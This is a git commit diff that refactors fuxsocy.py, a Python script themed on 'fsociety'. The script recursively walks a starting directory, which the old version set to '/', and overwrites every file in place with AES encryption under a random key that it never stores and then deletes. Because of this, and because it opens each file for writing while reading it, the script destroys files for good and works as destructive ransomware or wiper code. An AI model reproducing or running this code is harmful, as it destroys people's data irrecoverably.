a11ebf6ba8aa2587585ca9681f264831c9c730dd
Joe Kendal <kendaljoe0@gmail.com>
2017-05-13 13:28:41 +0100

    cleaner

--- fuxsocy.py
+++ fuxsocy.py
@@ -7,58 +7,79 @@ from Crypto import Random
 from random import SystemRandom
 from string import ascii_letters, digits, punctuation
 
+START_DIR = '/Users/developer/test_dir'
+SALT = 'fsociety'
+CS = 64*1024
 
-def encrypt(root, filename):
-    fn = root + '/' + filename
-    pw = 'fsociety'.join((''.join(SystemRandom().choice(ascii_letters + digits + punctuation) for x in range(SystemRandom().randint(4, 16)))) for x in range(SystemRandom().randint(8, 12)))
-    hasher = SHA256.new(pw.encode('utf-8'))
-    key = hasher.digest()
-    cs = 64*1024
-    of = fn
-    fs = str(os.path.getsize(fn)).zfill(16)
+
+def encrypt(root, filename, key):
+    file_path = root + '/' + filename
+    file_size = str(os.path.getsize(file_path)).zfill(16)
     iv = Random.new().read(16)
     encryptor = AES.new(key, AES.MODE_CBC, iv)
-    with open(fn, 'rb') as infile:
-        with open(of, 'wb') as outfile:
-            outfile.write(fs.encode('utf-8'))
+
+    with open(file_path, 'rb') as infile:
+        with open(file_path, 'wb') as outfile:
+            outfile.write(file_size.encode('utf-8'))
             outfile.write(iv)
             while True:
-                c = infile.read(cs)
-                if len(c) == 0:
+                chunk = infile.read(CS)
+                if len(chunk) == 0:
                     break
-                elif len(c) % 16 != 0:
-                    c += b' ' * (16 - (len(c) % 16))
-                outfile.write(encryptor.encrypt(c))
+                elif len(chunk) % 16 != 0:
+                    chunk += b' ' * (16 - (len(chunk) % 16))
+                outfile.write(encryptor.encrypt(chunk))
 
 
-def recurse(directory):
+def recurse(directory, key):
     root = next(os.walk(directory))[0]
     directories = next(os.walk(directory))[1]
     files = next(os.walk(directory))[2]
 
     for file in files:
-        encrypt(root, file)
+        encrypt(root, file, key)
 
     if len(directories) > 0:
         for directory in directories:
             subdirectories = next(os.walk(os.path.join(root, directory)))[1]
+            subfiles = next(os.walk(os.path.join(root, directory)))[2]
+            for subfile in subfiles:
+                encrypt(next(os.walk(os.path.join(root, directory)))[0], subfile, key)
             if len(subdirectories) > 0:
                 for subdirectory in subdirectories:
                     path = root + '/' + directory + '/' + subdirectory
                     try:
-                        recurse(directory=path)
+                        recurse(directory=path, key=key)
                     except UnicodeEncodeError:
                         pass
-            else:
-                pass
+
+
+def gen_key(salt):
+    print('Generating key...')
+    password = salt.join((''.join(SystemRandom().choice(ascii_letters + digits + punctuation) for x in range(SystemRandom().randint(40, 160)))) for x in range(SystemRandom().randint(80, 120)))
+    hasher = SHA256.new(password.encode('utf-8'))
+    return hasher.digest()
+
+
+def pwn():
+    key = gen_key(SALT)
+    dirs = next(os.walk(START_DIR))[1]
+    for dir in dirs:
+        if START_DIR == '/':
+            directory = START_DIR + dir
+        else:
+            directory = START_DIR + '/' + dir
+        print('Encrypting {}'.format(directory))
+        recurse(directory, key)
+    del key
+    exit(0)
 
 
 def main():
-    START_DIR = '/'
-    if input('Are you sure? (y/n) ') == 'y':
-        recurse(START_DIR)
+    if input('Are you sure? (y/N) ') == 'y':
+        pwn()
     else:
-        print('Good')
+        exit(0)
 
 if __name__ == '__main__':
     main()
